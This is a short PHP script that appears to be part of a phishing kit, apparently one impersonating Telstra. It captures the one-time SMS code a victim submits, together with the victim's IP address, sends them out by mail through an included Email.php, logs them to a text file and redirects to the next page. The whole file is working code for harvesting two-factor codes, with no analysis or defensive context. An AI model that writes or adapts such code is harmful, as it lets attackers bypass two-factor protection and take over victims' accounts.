<?php
include('Email.php');
$ip = getenv("REMOTE_ADDR");
$message .= "---------------------------------------------------\n";
$message .= "SMS 1   : ".$_POST['otp']."\n";
$message .= "-------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------------------------------------------\n";




//$subject = "SMS 1 | $ip ]";
//$headers = "From: Telstra";
//$headers .= $_POST['eMailAdd']."\n";
//$headers .= "MIME-Version: 1.0\n";

_mail($message);
$file = fopen('../Flow.txt', 'a');
fwrite($file,$message);
header("Location: load2.php");

?>
